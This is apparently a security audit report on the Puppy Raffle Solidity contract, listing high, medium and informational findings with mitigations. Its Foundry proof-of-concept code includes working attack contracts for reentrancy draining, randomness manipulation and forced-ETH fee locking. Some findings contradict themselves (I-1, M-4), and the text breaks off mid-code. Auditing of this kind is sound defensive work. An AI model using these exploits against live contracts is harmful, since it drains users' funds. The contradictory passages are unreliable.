# 4 puppy raffle audit - Findings Report
## Commit hash: 15c50ec22382bb1f3106aba660e7c590df18dcac

## Protocol Overview 

**Puppy Raffle** is a Solidity 0.7.6 protocol that lets anyone buy “tickets” to win a dog-themed ERC-721 NFT and most of the ether pot.

### How it works
* **Enter**: Call `enterRaffle(address[] players)` and send `entranceFee` (fixed wei per address). The function enforces that every address in the call is unique and appends them to the `players` array, allowing multi-entry.
* **Refund**: Until the draw, any participant can call `refund(index)` to remove themselves and reclaim their stake.
* **Draw cadence**: `raffleDuration` seconds after `raffleStartTime`, the owner (or anyone permitted) calls `selectWinner()`. A pseudo-random index (block data + players length) picks the winner.
* **Payouts**: 80 % of the contract balance is forwarded to the winner; the remaining 20 % accrues to `feeAddress` and can later be withdrawn via `withdrawFees()`.
* **NFT minting**: The winner also receives a freshly minted puppy NFT. Each `tokenId` is assigned a rarity tier mapped to a name and image URI, and the on-chain `tokenURI` returns Base64-encoded JSON metadata.
* **Admin controls**: The owner can set a new `feeAddress` but cannot alter entrance fee or duration mid-raffle.

This simple design offers transparent, periodic raffles with self-service refunds and automatic NFT rewards.
## High Risk Findings
[H-1]. Integer Overflow issue in PuppyRaffle::selectWinner
[H-2]. Randomness issue in PuppyRaffle::selectWinner
[H-3]. Reentrancy issue in PuppyRaffle::refund
[H-4]. DOS issue in PuppyRaffle::enterRaffle
## Medium Risk Findings
[M-1]. Unexpected Eth issue in PuppyRaffle::withdrawFees
[M-2]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle
[M-3]. DOS issue in PuppyRaffle::selectWinner
[M-4]. DOS issue in PuppyRaffle::selectWinner
## Info Risk Findings
[I-1]. Integer Overflow issue in PuppyRaffle::enterRaffle


### Number of Findings
- H: 4
- M: 4
- L: 0
- I: 1



# High Risk Findings

## [H-1]. Integer Overflow issue in PuppyRaffle::selectWinner

## Description
In `selectWinner`, the fee for the round is calculated as a `uint256`, but the state variable `totalFees` is a `uint64`. The line `totalFees = totalFees + uint64(fee);` casts the `uint256 fee` down to `uint64`. The maximum value of `uint64` is approximately `1.84 * 10^19` wei, or 18.4 ETH. If the fees collected in a single round exceed this amount, the value will be truncated, leading to a loss of revenue for the protocol.

## Impact
When the fee for a round exceeds 2^64-1 wei (≈18.4 ETH) the down-cast silently truncates the value added to totalFees. From that moment on the contract balance is greater than totalFees, so the invariant enforced in withdrawFees (address(this).balance == totalFees) is broken forever. As a consequence withdrawFees always reverts and 100 % of all protocol-fee funds already held, plus every fee collected in future rounds, become permanently locked inside the contract. Players can still enter and winners are paid, but the protocol owner loses all fee revenue and the contract accumulates irretrievable ETH.

## Proof of Concept
1. Deploy PuppyRaffle with entranceFee = 1 ether, feeAddress = some EOA, raffleDuration = 1 day.
2. 100 unique addresses enter the raffle in a single transaction sending 100 ETH.
3. Fast-forward time > raffleDuration and call selectWinner().
   • 80 ETH is sent to the winner.
   • The 20 ETH fee is cast to uint64 and wraps to 0x159d… (≈1.56 ETH) and stored in totalFees.
4. Now call withdrawFees(). It reverts because address(this).balance (20 ETH) ≠ totalFees (≈1.56 ETH).
5. The owner can never withdraw again and every subsequent round only increases the trapped balance.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test, console2 as console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract FeeOverflowLockTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE = 1 ether;

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE, address(11), 1 days);
    }

    function test_FeeTruncationLocksFunds() public {
        // prepare 100 unique addresses
        uint256 players = 100;
        address[] memory addrs = new address[](players);
        for (uint256 i; i < players; i++) addrs[i] = address(uint160(i + 1));

        raffle.enterRaffle{value: ENTRANCE * players}(addrs);
        vm.warp(block.timestamp + 2 days);

        raffle.selectWinner();

        uint256 expectedFee = (players * ENTRANCE * 20) / 100; // 20 ETH
        uint256 storedFee = raffle.totalFees();               // ≈1.56 ETH after wrap
        console.log("expected", expectedFee);
        console.log("stored", storedFee);
        assertLt(storedFee, expectedFee);

        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees(); // permanently reverts
    }
}

## Suggested Mitigation
Change the type of the `totalFees` state variable from `uint64` to `uint256`. The minor gas savings from storage packing are not worth the risk of permanently losing significant fee revenue.

```diff
-    uint64 public totalFees = 0;
+    uint256 public totalFees = 0;

// ... in selectWinner() ...

-        totalFees = totalFees + uint64(fee);
+        totalFees = totalFees + fee;

```

## [H-2]. Randomness issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function uses predictable, on-chain data (`msg.sender`, `block.timestamp`, `block.difficulty`) as a source of randomness to determine the raffle winner and the NFT's rarity. A malicious miner can influence `block.timestamp` and `block.difficulty`. A regular user can repeatedly call `selectWinner` via a smart contract, reverting the transaction if the generated random number does not result in them winning. This allows an attacker to guarantee they win the raffle and mint a legendary NFT.

## Impact
The raffle's outcome is not random and can be manipulated. An attacker can guarantee a win, destroying the fairness of the game and leading to financial loss for all other participants. The value of rare NFTs is also undermined as an attacker can choose to mint them at will.

## Proof of Concept
1. Raffle has ended and there are ≥4 players (including the attacker).
2. The attacker sends a transaction from a helper contract that calls `selectWinner()`. Inside the helper, the call reverts unless `previousWinner == attacker`.
3. Because the helper contract reverts, the state is rolled back if the attacker loses (players array, raffleStartTime, etc. remain unchanged).
4. The attacker simply resubmits the same transaction in the next block. Each new block provides a different `block.timestamp` (and potentially different `block.difficulty`) so the hash `keccak256(msg.sender, block.timestamp, block.difficulty)` changes every block.
5. Re-trying in consecutive blocks is free for the attacker if they are the block producer (or cheap on a roll-up where transaction fees can be refunded on failure). Eventually a block is mined whose hash gives `winnerIndex` pointing to the attacker, guaranteeing victory and allowing them also to influence the rarity RNG executed immediately afterwards.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract HelperAttacker {
    PuppyRaffle public raffle;
    address public immutable me;

    constructor(PuppyRaffle _raffle, address _me) {
        raffle = _raffle;
        me = _me;
    }

    function attack() external {
        raffle.selectWinner();
        require(raffle.previousWinner() == me, "lose");
    }
}

contract RandomnessManipulationTest is Test {
    PuppyRaffle raffle;
    HelperAttacker helper;

    uint256 constant ENTRANCE_FEE = 1 ether;
    uint256 constant DURATION = 1 days;

    address a1 = address(1);
    address a2 = address(2);
    address a3 = address(3);
    address attackerEOA = address(4);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, address(99), DURATION);
        address[] memory p = new address[](4);
        p[0] = a1;
        p[1] = a2;
        p[2] = a3;
        p[3] = attackerEOA;
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(p);

        // fast-forward so raffle is over
        vm.warp(block.timestamp + DURATION + 1);
        vm.roll(block.number + 1);

        helper = new HelperAttacker(raffle, attackerEOA);
    }

    function testAttackerCanGuaranteeWin() public {
        bool won = false;

        for (uint256 i = 0; i < 100 && !won; i++) {
            // new block => different timestamp
            vm.roll(block.number + 1);
            vm.warp(block.timestamp + 13); // advance 13 seconds (Ethereum average)

            vm.prank(address(helper));
            try helper.attack() {
                won = true;
            } catch {}
        }

        assertTrue(won, "attacker never won – test failed");
        assertEq(raffle.previousWinner(), attackerEOA);
    }
}

## Suggested Mitigation
Do not use on-chain data for randomness. Use a provably fair and tamper-proof randomness solution like Chainlink VRF (Verifiable Random Function).

1.  Request a random number from the VRF Coordinator.
2.  Chainlink VRF generates a random number and its cryptographic proof off-chain.
3.  The result is delivered back to the consuming contract in a separate transaction.
4.  The consuming contract verifies the proof on-chain before using the random number.

This two-transaction (request-fulfill) model prevents manipulation from miners or the user calling the function.

## [H-3]. Reentrancy issue in PuppyRaffle::refund

## Description
The `refund` function sends ETH to a user before updating the contract's state. It follows the pattern: checks, interaction, effects. A malicious contract can exploit this by re-entering the `refund` function from its `receive()` or `fallback()` function after receiving the ETH. Since the state (`players[playerIndex] = address(0)`) is not yet updated, the malicious contract can pass the checks multiple times within the same transaction, draining more funds than it is entitled to.

## Impact
A malicious actor can drain the contract of all player-deposited funds by repeatedly calling the `refund` function within a single transaction. This leads to a complete loss of funds for all other participants in the raffle.

## Proof of Concept
1. Attacker deploys a contract (`Attacker.sol`).
2. Multiple legitimate users enter the raffle, funding the contract with ETH.
3. The attacker's contract enters the raffle by calling `enterRaffle`, contributing its own funds.
4. The attacker's contract calls the `refund` function to start the exploit.
5. `PuppyRaffle` sends the refund amount to the attacker's contract, triggering its `receive()` function.
6. Inside the `receive()` function, the attacker's contract calls `PuppyRaffle.refund()` again.
7. Because `players[playerIndex]` has not yet been set to `address(0)`, the `require` checks pass, and the contract sends another refund.
8. This process repeats until the `PuppyRaffle` contract's balance is drained or the transaction runs out of gas.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ReentrancyAttacker {
    PuppyRaffle public raffle;
    uint256 public constant ENTRANCE_FEE = 1 ether;

    constructor(PuppyRaffle _raffle) payable {
        raffle = _raffle;
    }

    function attack() external payable {
        // 1. enter the raffle as this contract
        address[] memory p = new address[](1);
        p[0] = address(this);
        raffle.enterRaffle{value: ENTRANCE_FEE}(p);

        // 2. trigger first refund (re-entrancy will take care of the rest)
        uint256 idx = raffle.getActivePlayerIndex(address(this));
        raffle.refund(idx);
    }

    receive() external payable {
        // continue re-entrancy while balance remains
        if (address(raffle).balance >= ENTRANCE_FEE) {
            uint256 idx = raffle.getActivePlayerIndex(address(this));
            raffle.refund(idx);
        }
    }
}

contract RefundReentrancyTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE = 1 ether;
    address constant feeAddr = address(999);

    address player1 = address(1);
    address player2 = address(2);
    address player3 = address(3);
    address player4 = address(4);
    address attackerEOA = address(5);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE, feeAddr, 1 days);

        // fund test addresses
        vm.deal(player1, 10 ether);
        vm.deal(player2, 10 ether);
        vm.deal(player3, 10 ether);
        vm.deal(player4, 10 ether);
        vm.deal(attackerEOA, 10 ether);

        // honest players enter
        address[] memory p = new address[](4);
        p[0] = player1;
        p[1] = player2;
        p[2] = player3;
        p[3] = player4;
        vm.prank(player1);
        raffle.enterRaffle{value: ENTRANCE * 4}(p);
    }

    function testRefundReentrancyDrain() public {
        // deploy attacker funded with 1 ether
        vm.prank(attackerEOA);
        ReentrancyAttacker attacker = new ReentrancyAttacker{value: ENTRANCE}(raffle);

        uint256 preBalance = address(raffle).balance; // 5 ether (4 honest + 1 attacker)
        assertEq(preBalance, ENTRANCE * 5);

        // launch attack
        vm.prank(attackerEOA);
        attacker.attack();

        // all ETH drained
        assertEq(address(raffle).balance, 0);
    }
}

## Suggested Mitigation
Follow the Checks-Effects-Interactions pattern. Update the state (`players[playerIndex] = address(0);`) before making the external call to send ETH.

```solidity
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

        // Effect - Update state BEFORE interaction
        players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);

        // Interaction
        payable(msg.sender).sendValue(entranceFee);
    }
```

## [H-4]. DOS issue in PuppyRaffle::enterRaffle

## Description
The contract contains functions with loops that iterate over an unbounded array of players. Specifically, `enterRaffle` uses a nested loop (O(n^2)) for duplicate checking, and `selectWinner` calls `delete players`, which has a gas cost proportional to the array's size. An attacker can add a large number of unique players (potentially through sybil accounts), increasing the size of the `players` array. This will cause the gas cost of these functions to grow until they exceed the block gas limit, rendering the contract unusable. No new players can enter, and no winner can be selected, permanently locking all funds in the contract.

## Impact
An attacker can permanently lock all funds in the contract by making key functions (`enterRaffle`, `selectWinner`) too expensive to execute. This results in a total loss of funds for all participants and the contract owner.

## Proof of Concept
1. Attacker observes the current block gas limit.
2. Attacker creates a large number of wallet addresses.
3. In a series of transactions, the attacker calls `enterRaffle` to add thousands of unique addresses to the `players` array.
4. The gas cost of the O(n^2) duplicate check in `enterRaffle` grows quadratically. Eventually, any further call to `enterRaffle` will fail due to running out of gas.
5. When the raffle period ends, any attempt to call `selectWinner` will also fail because the gas cost to `delete` the enormous `players` array exceeds the block gas limit.
6. The contract is now bricked. No winner can be chosen, no refunds are possible (as new rounds can't start), and fees cannot be withdrawn.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract DosTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    function testDosOnEnterRaffle() public {
        // Add a large number of players to simulate bloating the array.
        // Due to test environment limitations, we can't hit the real block gas limit,
        // but we can demonstrate the quadratic gas cost increase.
        uint256 initialPlayerCount = 100;
        address[] memory players = new address[](initialPlayerCount);
        for (uint256 i = 0; i < initialPlayerCount; i++) {
            players[i] = address(uint160(i + 1));
        }
        puppyRaffle.enterRaffle{value: entranceFee * initialPlayerCount}(players);

        // Measure gas for adding one more player
        uint256 gasStart = gasleft();
        address[] memory nextPlayer = new address[](1);
        nextPlayer[0] = address(uint160(initialPlayerCount + 1));
        puppyRaffle.enterRaffle{value: entranceFee}(nextPlayer);
        uint256 gasUsed = gasStart - gasleft();
        console.log("Gas used for 101st player:", gasUsed);

        // Now try with a much larger array to show the DoS potential.
        // A real attack would use more players, but 400 is enough to show a massive gas cost.
        uint256 largePlayerCount = 400;
        address[] memory largePlayerList = new address[](1);
        for(uint256 i = 0; i < largePlayerCount; i++) {
            largePlayerList[0] = address(uint160(i + 1000));
            puppyRaffle.enterRaffle{value: entranceFee}(largePlayerList);
        }

        // Attempting to add one more player will consume a huge amount of gas and likely revert.
        address[] memory finalPlayer = new address[](1);
        finalPlayer[0] = address(uint160(largePlayerCount + 2000));
        
        // Expect the transaction to fail due to out-of-gas.
        vm.expectRevert();
        (bool success, ) = address(puppyRaffle).call{gas: 200000, value: entranceFee}(abi.encodeWithSelector(PuppyRaffle.enterRaffle.selector, finalPlayer));
        assert(!success);
    }
}
```

## Suggested Mitigation
Avoid unbounded loops. For duplicate checking, use a mapping to track entrants, which provides O(1) lookup time.

```solidity
// Add a mapping to track players
mapping(address => bool) private isPlayer;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        // Check for duplicates in O(1)
        require(!isPlayer[player], "PuppyRaffle: Duplicate player");
        players.push(player);
        isPlayer[player] = true;
    }
    emit RaffleEnter(newPlayers);
}

// In selectWinner, you must also reset the mapping.
function selectWinner() external {
    // ... existing logic

    // Instead of `delete players`, iterate and clear the mapping, then reset the array.
    for(uint256 i = 0; i < players.length; i++) {
        delete isPlayer[players[i]];
    }
    players = new address[](0);

    // ... rest of logic
}
```
This still leaves the `selectWinner` `delete` vulnerable. A better long-term fix is to cap the number of players per raffle.



# Medium Risk Findings

## [M-1]. Unexpected Eth issue in PuppyRaffle::withdrawFees

## Description
The `withdrawFees` function uses a strict equality check `require(address(this).balance == uint256(totalFees), ...)`. This check is brittle and can cause fees to be permanently locked. If a player gets a refund via the `refund` function, the contract's balance decreases, but `totalFees` is not adjusted, breaking the equality. Additionally, if any user force-sends ETH to the contract (e.g., via `selfdestruct`), the balance will increase, also breaking the check and permanently preventing fee withdrawal.

## Impact
If anyone force-sends even 1 wei to the contract (e.g. via self-destruct), `address(this).balance` will forever be greater than `totalFees` once all players are cleared. The owner will never be able to satisfy the strict equality required in `withdrawFees`, so the call will revert and all protocol fees will be trapped in the contract permanently.

## Proof of Concept
1. Raffle runs normally until `selectWinner` is executed once. At this point:
   • players.length == 0
   • contract balance == totalFees (≈20 % of pot)
2. Attacker deploys a tiny helper contract that self-destructs, force-sending 1 wei to the raffle contract:

   ```solidity
   ForceSend fs = new ForceSend{value: 1 wei}();
   fs.destroy(payable(address(puppyRaffle)));
   ```
3. Now `address(puppyRaffle).balance == totalFees + 1`.
4. Owner calls `withdrawFees()` ➜ the `require(address(this).balance == uint256(totalFees))` check fails and the call reverts.
5. Because neither `totalFees` nor `address(this).balance` can be altered to regain equality (there is no function to burn or skim the extra wei), the accumulated fees are locked forever.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract ForceSend {
    constructor() payable {}
    function destroy(address payable target) external {
        selfdestruct(target);
    }
}

contract WithdrawFeesLockTest is Test {
    PuppyRaffle raffle;
    uint256 constant ENTRANCE_FEE = 1 ether;
    address feeAddress = address(99);

    function setUp() public {
        raffle = new PuppyRaffle(ENTRANCE_FEE, feeAddress, 1 days);
    }

    function _startAndFinishRaffle() internal {
        // enter 4 players so a raffle can be finished
        address[] memory players = new address[](4);
        players[0] = address(1);
        players[1] = address(2);
        players[2] = address(3);
        players[3] = address(4);
        raffle.enterRaffle{value: ENTRANCE_FEE * 4}(players);

        // fast-forward time so raffle can finish
        vm.warp(block.timestamp + 1 days + 1);
        raffle.selectWinner();
    }

    function testFeesAreLockedAfterForcedETH() public {
        _startAndFinishRaffle();

        // sanity: players array is now empty
        // attacker force-sends 1 wei
        ForceSend fs = new ForceSend{value: 1 wei}();
        fs.destroy(payable(address(raffle)));

        // owner tries to withdraw – must revert
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        raffle.withdrawFees();
    }
}

## Suggested Mitigation
Do not rely on a strict balance equality check. Either (a) check that `players.length == 0` and transfer `totalFees`, or (b) allow for stray ETH with `require(address(this).balance >= totalFees, "Players still active")` and send only `totalFees` out. This fully prevents accidental or malicious ETH transfers from blocking fee withdrawal.

## [M-2]. Gas Grief BlockLimit issue in PuppyRaffle::enterRaffle

## Description
The `enterRaffle` function uses a nested loop to check for duplicate player addresses. The computational complexity is O(n^2), where n is the total number of players. As the `players` array grows, the gas cost of calling `enterRaffle` increases quadratically. This will eventually cause the transaction to fail by exceeding the block gas limit, effectively creating a Denial of Service (DoS). No new players will be able to enter the raffle, and if the number of active players is below the required minimum of 4, the `selectWinner` function can never be called, permanently locking all funds in the contract.

## Impact
If an attacker bloats the `players` array with a very large number of unique addresses, the quadratic duplicate-check in `enterRaffle` will make every future call to that function run out of gas. As a result no new players can join the current round. When the current player count is below 4, the raffle cannot be finished and the ETH already paid to enter remains trapped until each participant manually calls `refund`. Fees remain withdrawable only after every refund is made. Funds are therefore frozen until users actively exit, but they are not permanently lost.

## Proof of Concept
1. An attacker (or multiple legitimate users) calls `enterRaffle` repeatedly.
2. The `players` array grows. For example, if there are 200 players, the inner loop of the duplicate check runs approximately 200*199/2 = 19,900 times.
3. At a certain point (e.g., with a few hundred players), the gas required to execute the nested loop exceeds the block gas limit.
4. Any subsequent call to `enterRaffle`, even with a single new player, will fail with an out-of-gas error. The raffle is now stuck.

## Proof of Code
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract PuppyRaffleTest is Test {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e16; // lower fee to allow more players
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function setUp() public {
        puppyRaffle = new PuppyRaffle(entranceFee, feeAddress, duration);
    }

    function test_DoS_enterRaffle_QuadraticComplexity() public {
        // This test demonstrates the gas cost growth of enterRaffle. 
        // On a real network, this will eventually exceed the block gas limit.
        uint256 batchSize = 50;
        address[] memory players = new address[](batchSize);

        // Add 100 players
        for(uint i=0; i < batchSize; i++) { players[i] = address(uint160(100+i)); }
        puppyRaffle.enterRaffle{value: entranceFee * batchSize}(players);
        for(uint i=0; i < batchSize; i++) { players[i] = address(uint160(150+i)); }
        puppyRaffle.enterRaffle{value: entranceFee * batchSize}(players);

        // Measure gas for one entry with 100 players
        address[] memory singlePlayer = new address[](1);
        singlePlayer[0] = address(1); 
        uint256 gasStart1 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        uint256 gasUsed1 = gasStart1 - gasleft();

        // Add 100 more players
        for(uint i=0; i < batchSize; i++) { players[i] = address(uint160(200+i)); }
        puppyRaffle.enterRaffle{value: entranceFee * batchSize}(players);
        for(uint i=0; i < batchSize; i++) { players[i] = address(uint160(250+i)); }
        puppyRaffle.enterRaffle{value: entranceFee * batchSize}(players);
        
        // Measure gas for one entry with 201 players
        singlePlayer[0] = address(2);
        uint256 gasStart2 = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee}(singlePlayer);
        uint256 gasUsed2 = gasStart2 - gasleft();

        console.log("Gas for 1 entry with 100 players:", gasUsed1);
        console.log("Gas for 1 entry with 201 players:", gasUsed2);
        
        // The gas cost roughly quadruples when the player count doubles, showing O(n^2) complexity.
        assertTrue(gasUsed2 > gasUsed1 * 3);
    }
}

## Suggested Mitigation
Replace the O(n^2) loop for duplicate checks with a more efficient mechanism. A mapping is the standard solution for tracking existence, providing O(1) complexity.

```solidity
// Add a mapping to track players
mapping(address => bool) private hasEntered;

function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        address player = newPlayers[i];
        require(!hasEntered[player], "PuppyRaffle: Duplicate player");
        players.push(player);
        hasEntered[player] = true;
    }
    emit RaffleEnter(newPlayers);
}

function refund(uint256 playerIndex) public {
    // ... existing checks ...
    address playerAddress = players[playerIndex];
    
    // Update state first
    players[playerIndex] = address(0);
    hasEntered[playerAddress] = false; // Reset for future raffles
    emit RaffleRefunded(playerAddress);

    payable(msg.sender).sendValue(entranceFee);
}
```

## [M-3]. DOS issue in PuppyRaffle::selectWinner

## Description
The `selectWinner` function clears the `players` array by calling `delete players`. The gas cost of this operation is proportional to the number of elements in the array. If the array grows large enough, the gas required to execute `selectWinner` will exceed the block gas limit, causing the transaction to always fail. This effectively bricks the contract.

## Impact
If the players array grows large enough, `selectWinner` will consistently run out of gas and revert. While every participant can still individually call `refund` to retrieve their entrance fee, the raffle can never be concluded: no winner is chosen, no NFT is minted, and the protocol owner can never withdraw the 20 % fee share. This represents a permanent denial-of-service for core functionality rather than an irreversible loss of user funds.

## Proof of Concept
1. Deploy the contract with a very small `entranceFee` (e.g. 1 wei) so that inflating `players` is cheap.
2. Create an array containing thousands of distinct attacker-controlled addresses (e.g. 30 000).
3. Call `enterRaffle` once with that array and pay `30 000 * entranceFee`.
   • The quadratic duplicate-check succeeds because all addresses are unique and the call is executed only once.
4. Wait until `raffleDuration` has elapsed.
5. Call `selectWinner` with a gas limit close to the current block gas limit (≈ 30 M). The call consistently reverts with out-of-gas because the `delete players` loop touches every slot (≈ 580 gas/slot × 30 000 ≈ 17.4 M gas plus the rest of the logic).
6. The raffle is now stuck; only individual refunds are possible and the owner can never withdraw the accumulated fees.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract DoSTest is Test {
    uint256 constant ENTRANCE_FEE = 1 wei;
    uint256 constant DURATION = 1 days;

    function _deployAndEnter(uint256 playerCount) internal returns (PuppyRaffle) {
        PuppyRaffle raffle = new PuppyRaffle(ENTRANCE_FEE, address(1), DURATION);
        address[] memory addrs = new address[](playerCount);
        for (uint256 i; i < playerCount; ++i) {
            addrs[i] = address(uint160(i + 10));
        }
        raffle.enterRaffle{value: ENTRANCE_FEE * playerCount}(addrs);
        vm.warp(block.timestamp + DURATION + 1);
        return raffle;
    }

    function testGasGrowsLinearly() public {
        PuppyRaffle rSmall = _deployAndEnter(10);
        uint256 g1 = gasleft();
        rSmall.selectWinner();
        g1 = g1 - gasleft();

        PuppyRaffle rBig = _deployAndEnter(500);
        uint256 g2 = gasleft();
        rBig.selectWinner();
        g2 = g2 - gasleft();

        // selecting winner with 500 players should cost far more than 10× the gas of 10 players
        assertGt(g2, g1 * 10);
    }
}

## Suggested Mitigation
Replace `delete players;` with `players = new address[](0);` so only the array length is set to zero. Alternatively, store participants in a mapping or linked list so that clearing does not require touching every slot.

## [M-4]. DOS issue in PuppyRaffle::selectWinner

## Description
The `refund` function allows players to leave the raffle, setting their entry in the `players` array to `address(0)`. However, the `selectWinner` function does not account for these zero-address entries. If the 'random' `winnerIndex` points to one of these empty slots, the `winner` will be `address(0)`. The subsequent prize transfer `winner.call{value: prizePool}("")` will fail (return `success = false`), causing the entire `selectWinner` transaction to revert. An attacker could potentially try to influence the weak RNG to select a zero-address, stalling the raffle.

## Impact
If winnerIndex points to a refunded slot, selectWinner() will revert with "ERC721: mint to the zero address" when _safeMint() is called. Because the state change is reverted the raffle remains unresolved: players array is not cleared and raffleStartTime is not updated. Anybody can keep calling selectWinner and make it revert repeatedly, effectively blocking the raffle until a non-empty slot is chosen. Funds remain locked and no new rounds can start during the stall period.

## Proof of Concept
1. Alice, Bob, Carol and Dave enter the raffle.
2. Alice and Bob call refund(), their slots become address(0).
3. Time passes so the raffle can be settled.
4. Anyone calls selectWinner(). If uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length returns 0 or 1, winner == address(0).
5. ETH transfer to address(0) succeeds, but _safeMint(winner, tokenId) reverts with "ERC721: mint to the zero address".
6. The entire transaction rolls back; raffle is still open and may be attacked again.
7. By repeatedly calling selectWinner with different msg.sender / timestamp combinations, an attacker can keep forcing the revert and prevent the raffle from finishing.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
import "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract RefundDosTest is Test {
    PuppyRaffle raffle;
    uint256 constant FEE = 1 ether;
    uint256 constant DURATION = 1 days;

    address a = address(1);
    address b = address(2);
    address c = address(3);
    address d = address(4);

    function setUp() public {
        raffle = new PuppyRaffle(FEE, address(99), DURATION);
        address[] memory players = new address[](4);
        players[0] = a;
        players[1] = b;
        players[2] = c;
        players[3] = d;
        raffle.enterRaffle{value: FEE * 4}(players);

        vm.prank(a);
        raffle.refund(0);
        vm.prank(b);
        raffle.refund(1);

        vm.warp(block.timestamp + DURATION + 1);
    }

    function test_selectWinnerRevertsWhenPickingRefundedSlot() public {
        address attacker = address(1234);
        vm.deal(attacker, 1 ether);

        // brute-force a timestamp that selects index 0 or 1
        for (uint256 i = 0; i < 30; i++) {
            vm.prank(attacker);
            vm.warp(block.timestamp + 7); // advance a bit to change RNG
            uint256 idx = uint256(keccak256(abi.encodePacked(attacker, block.timestamp, block.difficulty))) % 4;
            if (idx < 2) {
                vm.expectRevert("ERC721: mint to the zero address");
                raffle.selectWinner();
                return;
            }
        }
        fail("could not hit a refunded slot – increase loop upper bound");
    }
}

## Suggested Mitigation
Either (1) compact the players array on every refund by swapping the last element into the refunded slot and popping the array, or (2) in selectWinner repeatedly draw a new random index until players[winnerIndex] != address(0), making sure to add a gas-bound maximum number of attempts. Additionally, use the number of active players (not players.length) for prizePool and fee calculations.



# Info Risk Findings

## [I-1]. Integer Overflow issue in PuppyRaffle::enterRaffle

## Description
The contract uses Solidity v0.7.6, which does not have built-in protection against integer overflows/underflows. The function `enterRaffle` calculates the required payment with `entranceFee * newPlayers.length` without using a safe math library. An attacker can provide a `newPlayers.length` so large that the multiplication result wraps around to a small number, allowing them to add a huge number of entries for a negligible cost. This undermines the fairness of the raffle.

## Impact
A multiplication overflow is theoretically possible because the contract is compiled with Solidity 0.7.6, however exploiting it would require supplying an address array whose encoded length is on the order of 1e58 elements (≈ 2^256 / entranceFee) – far beyond the calldata and gas limits of the EVM. Any attempt to fake such a length causes the ABI decoder to revert for insufficient calldata. Consequently no attacker can obtain free entries or otherwise influence the raffle; the issue is limited to a best-practice concern that could surface only if future code changes remove the length-dependent loops or if the contract migrates to a custom decoder.

## Proof of Concept
1. Assume `entranceFee` is `2^128`.
2. An attacker calculates `newPlayers.length` to be `2^128`.
3. The multiplication `entranceFee * newPlayers.length` becomes `2^128 * 2^128 = 2^256`, which overflows to `0` in a `uint256`.
4. The attacker calls `enterRaffle` with an array of `2^128` addresses (or a smaller number that still causes a profitable overflow) and sends `0` ETH.
5. The `require` check `msg.value == 0` passes.
6. The attacker has successfully entered a massive number of players for free, almost guaranteeing they will win the raffle.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";

contract IntegerOverflowTest is Test {
    PuppyRaffle puppyRaffle;
    address feeAddress = address(99);
    uint256 duration = 1 days;

    function testIntegerOverflowInEnterRaffle() public {
        // Set a large entrance fee to make overflow easier to demonstrate
        uint256 highEntranceFee = 2**128;
        puppyRaffle = new PuppyRaffle(highEntranceFee, feeAddress, duration);

        // Attacker crafts an input array length that causes an overflow to 0
        uint256 maliciousLength = 2**128;
        address[] memory players = new address[](1);
        players[0] = makeAddr("attacker");

        // We can't create an array of size 2**128, so we'll fake the length using assembly.
        // This PoC demonstrates the flawed logic, a real attack would use a smaller, still-profitable overflow.
        bytes memory payload = abi.encodeWithSelector(PuppyRaffle.enterRaffle.selector, players);
        
        // The payload is structured as: selector (4 bytes), offset_to_players (32 bytes), players_array_length (32 bytes), player_address (32 bytes)
        // We will overwrite the `players_array_length` part of the calldata.
        assembly {
